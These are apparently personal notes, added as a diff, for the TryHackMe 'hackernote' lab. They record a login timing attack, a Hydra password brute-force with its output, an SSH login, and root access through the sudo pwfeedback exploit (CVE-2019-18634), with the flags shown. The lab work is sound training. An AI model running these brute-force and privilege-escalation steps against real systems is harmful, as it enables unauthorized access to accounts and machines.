@@ -1,0 +1,104 @@
+htpp://hackernote.thm
+F12 --> debug
+
+Looking at the file ‘login.js’ we find the API endpoint ‘api/user/login’ this is where we will aim our bruteforce.
+I wrote this exploit using the challenge tips, you must provide the wordlist path in the first argument.
+
+/api/user/login
+vi brute-force.py
+
+./brute-force.py /usr/share/wordlists/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt
+loss time
+10.10.113.186
+
+Use the timing attack
+
+https://raw.githubusercontent.com/NinjaJc01/hackerNoteExploits/master/exploit.py
+
+change URL = "http://10.10.113.186/api/user/login"
+
+python3 exploit.py
+Starting POST Requests
+Finished POST requests
+Time delta: 1.3503713607788086 seconds (larger is better)
+james is likely to be valid
+
+
+./combinator.bin colors.txt numbers.txt > wordlist.txt
+
+cat wordlist.txt | wc -l
+180
+
+	hydra -l james -P wordlist.txt 10.10.113.186 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-03 01:27:26
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 180 login tries (l:1/p:180), ~12 tries per task
+[DATA] attacking http-post-form://10.10.113.186:80/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password
+[STATUS] 49.00 tries/min, 49 tries in 00:01h, 131 to do in 00:03h, 16 active
+[80][http-post-form] host: 10.10.113.186   login: james   password: blue7
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-03 01:28:38
+
+login: james   password: blue7
+
+My SSH details
+login http://hackernote.thm
+
+So that I don't forget, my SSH password is dak4ddb37b
+
+james:dak4ddb37b
+
+ssh james@10.10.113.186
+
+
+cat user.txt 
+thm{56911bd7ba1371a3221478aa5c094d68}
+
+
+Linux version 4.15.0-76-generic
+
+sudo --version
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2
+
+searchsploit sudo 1.8.2
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                       |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+sudo 1.8.0 < 1.8.3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypass + Privilege Escalation                                                                               | linux/local/25134.c
+sudo 1.8.0 < 1.8.3p1 - Format String                                                                                                                                 | linux/dos/18436.txt
+Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation                                                                                                     | linux/local/42183.c
+Sudo 1.8.25p - 'pwfeedback' Buffer Overflow                                                                                                                          | linux/local/48052.sh
+Sudo 1.8.25p - 'pwfeedback' Buffer Overflow (PoC)                                                                                                                    | linux/dos/47995.txt
+sudo 1.8.27 - Security Bypass                                                                                                                                        | linux/local/47502.py
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+
+searchsploit linux/dos/47995.txt
+cat 47995.txt 
+# Title: Sudo 1.8.25p - Buffer Overflow
+# Date: 2020-01-30
+# Author: Joe Vennix
+# Software: Sudo
+# Versions: Sudo versions prior to 1.8.26
+# CVE: CVE-2019-18634
+# Reference: https://www.sudo.ws/alerts/pwfeedback.html
+....
+
+https://www.sudo.ws/alerts/pwfeedback.html
+
+CVE-2019-18634
+github search
+https://github.com/saleemrashid/sudo-cve-2019-18634
+
+gcc exploit.c -o exploit
+
+# cat /root/root.txt
+thm{af55ada6c2445446eb0606b5a2d3a4d2}
+
+https://tryhackme.com/room/hackernote
+https://markramige.com/posts/tryhackme-hackernote-write-up/
+https://github.com/gr33nm0nk2802/TryHackMe/blob/master/HackerNote.md
